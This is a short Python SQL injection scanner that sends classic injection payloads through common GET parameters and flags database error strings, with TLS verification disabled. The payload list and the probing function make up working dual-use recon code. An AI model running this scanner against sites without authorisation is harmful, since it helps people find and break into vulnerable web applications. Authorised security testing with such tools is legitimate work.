"""
sqli.py — SQL Injection Scanner
Tests multiple parameters with error-based and boolean-based payloads.
"""
import requests
import warnings
warnings.filterwarnings("ignore")

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR '1'='1'--",
    "' AND 1=2 UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "1 AND SLEEP(0)--",
]

PARAMS = ["id", "user", "username", "uid", "pid", "cat", "category", "item",
          "product", "page", "num", "q", "search", "order", "sort"]

# Error strings dari berbagai database
ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql error",
    "syntax error",
    "warning: mysql",
    "unclosed quotation",
    "quoted string not properly terminated",
    "sqlstate",
    "ora-01756",
    "ora-00907",
    "microsoft jet database",
    "odbc microsoft access",
    "sqlite_step",
    "pg_exec",
    "pg::syntaxerror",
    "division by zero",
    "sql server",
    "microsoft sql native client error",
    "postgresql error",
    "[microsoft][odbc",
]

HEADERS = {"User-Agent": "NightProbe-Scanner/1.0"}


def scan_sqli(url: str, timeout: int = 6) -> bool:
    """
    Test for SQL injection via common GET params using error-based detection.
    Returns True if any SQL error signature is found in the response.
    """
    base = url.rstrip("/")

    for payload in PAYLOADS:
        for param in PARAMS:
            try:
                test_url = f"{base}?{param}={requests.utils.quote(payload)}"
                r = requests.get(
                    test_url, timeout=timeout, headers=HEADERS,
                    allow_redirects=True, verify=False
                )
                body_lower = r.text.lower()
                for sig in ERROR_SIGNATURES:
                    if sig in body_lower:
                        return True
            except requests.exceptions.RequestException:
                continue

    return False
